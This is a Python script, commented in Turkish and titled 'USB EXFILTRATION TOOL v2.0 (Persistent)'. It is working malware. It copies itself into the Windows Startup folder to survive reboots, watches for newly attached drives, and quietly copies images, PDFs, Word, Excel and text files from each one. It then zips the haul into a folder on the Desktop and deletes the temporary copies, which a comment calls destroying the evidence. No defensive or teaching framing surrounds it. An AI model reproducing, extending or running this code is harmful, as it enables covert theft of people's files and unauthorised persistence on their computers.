import os
import shutil
import time
import sys
from datetime import datetime

# --- AYARLAR ---
# Verilerin kaydedileceği ana üs (Masaüstü)
ANA_KLASOR = os.path.join(os.path.expanduser("~"), "Desktop", "Toplanan_Veriler")
HEDEF_UZANTILAR = [".jpg", ".jpeg", ".png", ".pdf", ".docx", ".txt", ".xlsx"]

def otomatik_baslat():
    """
    PERSISTENCE: Kendini başlangıç klasörüne kopyalar.
    Böylece bilgisayar yeniden başladığında kod otomatik çalışır.
    """
    try:
        # Windows Başlangıç Klasörü Yolu
        baslangic_yolu = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        
        # Şu an çalışan dosyanın yolu
        suanki_dosya = os.path.abspath(sys.argv[0])
        dosya_adi = os.path.basename(suanki_dosya)
        hedef_yol = os.path.join(baslangic_yolu, dosya_adi)

        # Eğer zaten oradaysak veya kopyası varsa işlem yapma
        if os.path.exists(hedef_yol):
            print("[*] Kalıcılık zaten aktif. (Startup klasöründe mevcut)")
        else:
            shutil.copy2(suanki_dosya, hedef_yol)
            print(f"[+] KALICILIK SAĞLANDI! Dosya şuraya kopyalandı:\n    {hedef_yol}")
    except Exception as e:
        print(f"[-] Kalıcılık hatası: {e}")

def suruculeri_bul():
    """Sistemdeki sürücü harflerini tarar."""
    suruculer = []
    for harf in 'DEFGHIJKLMNOPQRSTUVWXYZ':
        if os.path.exists(f"{harf}:/"):
            suruculer.append(f"{harf}:/")
    return suruculer

def verileri_cek_ve_ziple(usb_yolu):
    """USB'deki verileri çeker, ZİPLER ve kalıntıları temizler."""
    print(f"\n[+] HEDEF TESPİT EDİLDİ: {usb_yolu}")
    
    # 1. Geçici bir klasör oluştur (İşlem bitince silinecek)
    zaman_damgasi = datetime.now().strftime("%Y%m%d_%H%M%S")
    gecici_klasor_adi = f"Session_{zaman_damgasi}"
    gecici_yol = os.path.join(ANA_KLASOR, gecici_klasor_adi)
    
    if not os.path.exists(gecici_yol):
        os.makedirs(gecici_yol)

    print("   -> Veriler taranıyor ve kopyalanıyor...")
    sayac = 0
    
    # 2. Dosyaları geçici klasöre kopyala
    for root, dirs, files in os.walk(usb_yolu):
        for file in files:
            _, uzanti = os.path.splitext(file)
            if uzanti.lower() in HEDEF_UZANTILAR:
                try:
                    kaynak = os.path.join(root, file)
                    hedef = os.path.join(gecici_yol, file)
                    shutil.copy2(kaynak, hedef)
                    sayac += 1
                except:
                    pass
    
    if sayac > 0:
        print(f"   -> {sayac} dosya toplandı. Paketleniyor...")
        
        # 3. Klasörü ZİPLE (.zip yap)
        zip_ismi = os.path.join(ANA_KLASOR, f"LOG_{zaman_damgasi}")
        shutil.make_archive(zip_ismi, 'zip', gecici_yol)
        
        # 4. Delilleri yok et (Geçici klasörü sil, sadece zip kalsın)
        shutil.rmtree(gecici_yol)
        print(f"   [SUCCESS] Operasyon Başarılı! Paket: {zip_ismi}.zip")
    else:
        print("   [-] Hedef dosya bulunamadı. Geçici klasör temizleniyor.")
        shutil.rmtree(gecici_yol)

def ajan_modu():
    print("-" * 40)
    print("🕵️  USB EXFILTRATION TOOL v2.0 (Persistent)")
    print("-" * 40)
    
    # Önce kendini başlangıca ekle
    otomatik_baslat()
    
    print("\n[*] USB bekleniyor...")
    eski_suruculer = suruculeri_bul()
    
    while True:
        try:
            yeni_suruculer = suruculeri_bul()
            fark = set(yeni_suruculer) - set(eski_suruculer)
            
            if fark:
                for usb in fark:
                    time.sleep(2) # Sürücünün tam mount olması için bekle
                    verileri_cek_ve_ziple(usb)
            
            eski_suruculer = yeni_suruculer
            time.sleep(2)
        except KeyboardInterrupt:
            print("\nOperasyon durduruldu.")
            break
        except:
            pass

if __name__ == "__main__":
    ajan_modu()